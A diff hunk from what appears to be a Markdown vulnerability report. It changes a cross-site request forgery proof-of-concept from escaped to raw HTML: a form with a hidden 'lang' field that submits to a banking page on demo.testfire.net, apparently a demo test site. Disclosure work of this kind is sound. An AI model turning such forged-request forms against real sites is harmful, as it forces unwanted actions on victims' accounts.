@@ -245,14 +245,15 @@ Hacker could make the user do any operation if the user have the privilege. For 
 **The PoC HTML Source code:**
 
 ~~~~
-&lt;html&gt;
-  &lt;body&gt;
-    &lt;form action=&quot;http://demo.testfire.net/bank/customize.aspx&quot;&gt;
-      &lt;input type=&quot;hidden&quot; name=&quot;lang&quot; value=&quot;international&quot; /&gt;
-      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
-    &lt;/form&gt;
-  &lt;/body&gt;
-&lt;/html&gt;
+<html>
+  <body>
+    <form action="http://demo.testfire.net/bank/customize.aspx">
+      <input type="hidden" name="lang" value="international" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
 ~~~~
 
 **A screenshot (if applicable) of the vulnerability.**
